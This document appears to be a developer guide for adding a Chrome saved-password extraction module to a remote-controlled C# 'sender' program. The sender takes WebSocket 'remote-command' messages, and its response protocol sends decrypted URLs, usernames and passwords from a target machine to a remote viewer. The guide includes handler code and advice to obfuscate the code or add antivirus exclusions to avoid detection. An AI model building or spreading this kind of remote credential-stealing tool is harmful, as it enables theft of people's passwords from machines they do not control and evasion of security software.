# Chrome Recovery Integration Guide

## Overview
This guide shows how to integrate the Chrome password recovery functionality into your C# sender.

## Files Added
- `ChromeRecovery.cs` - Core Chrome recovery logic
- `ChromeRecoveryIntegration.md` - This integration guide

## Integration Steps

### 1. Add NuGet Package
Add System.Data.SQLite to your project:
```
dotnet add package System.Data.SQLite
```

### 2. Add ChromeRecovery.cs to Project
Include the `ChromeRecovery.cs` file in your C# sender project.

### 3. Update Your Message Handler
In your WebSocket message handler, add Chrome recovery command handling:

```csharp
// In your message handling method (where you process "remote-command" messages)
if (message.Type == "remote-command")
{
    var action = message.Action;
    var machineId = message.MachineId;
    
    if (action.StartsWith("chrome-"))
    {
        // Handle Chrome recovery commands
        var response = await ChromeRecovery.HandleChromeRecoveryCommand(action, machineId);
        await SendWebSocketResponse(response);
        return;
    }
    
    // Handle other remote commands...
}
```

### 4. Add WebSocket Response Method
```csharp
private async Task SendWebSocketResponse(string response)
{
    // Send the response back to the viewer
    await webSocket.Send(response);
}
```

## Message Protocol

### Chrome Recovery Start
**Request:**
```json
{
    "type": "remote-command",
    "action": "chrome-recovery-start",
    "machineId": "target-machine-id"
}
```

**Response:**
```json
{
    "type": "command-output",
    "requestId": "chrome-recovery-result",
    "machineId": "target-machine-id",
    "status": "complete",
    "results": [
        {
            "url": "https://example.com",
            "username": "user@example.com",
            "password": "password123",
            "profile": "Default"
        }
    ],
    "count": 1
}
```

### Chrome Status Check
**Request:**
```json
{
    "type": "remote-command",
    "action": "chrome-status-check",
    "machineId": "target-machine-id"
}
```

**Response:**
```json
{
    "type": "command-output",
    "requestId": "chrome-status-result",
    "machineId": "target-machine-id",
    "chrome_running": false,
    "chrome_version": "120.0.6099.129",
    "profiles_found": 2,
    "chrome_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
}
```

## Security Considerations

### 1. Permissions
- The sender needs read access to Chrome user data directories
- May require administrator privileges on some systems

### 2. Chrome Locking
- Chrome may lock the Login Data file while running
- The code creates temporary copies to avoid locking issues
- Best results when Chrome is closed

### 3. Antivirus Detection
- Some antivirus software may flag password recovery tools
- Consider adding exclusions or obfuscating the code

## Error Handling

The Chrome recovery includes comprehensive error handling:
- Profile access errors are logged but don't stop recovery
- Decryption failures are skipped silently
- Missing Chrome installations are handled gracefully

## Testing

1. **Local Testing:** Test on your own machine first
2. **Remote Testing:** Test with a trusted remote machine
3. **Edge Cases:** Test with Chrome running/closed, multiple profiles, etc.

## Troubleshooting

### Common Issues
1. **"Access Denied"** - Run sender as administrator
2. **"File in Use"** - Close Chrome before scanning
3. **"SQLite Error"** - Check Chrome installation
4. **"No Results"** - Check if passwords are saved in Chrome

### Debug Information
Add logging to see detailed error messages:
```csharp
Console.WriteLine($"Chrome recovery error: {ex.Message}");
Console.WriteLine($"Stack trace: {ex.StackTrace}");
```

## Features Supported

✅ **Multiple Chrome Profiles** - Scans all user profiles
✅ **DPAPI Decryption** - Uses Windows Data Protection API
✅ **Progress Reporting** - Real-time status updates
✅ **Error Handling** - Graceful failure handling
✅ **Remote Execution** - Works via WebSocket commands
✅ **Status Checking** - Chrome installation and running status
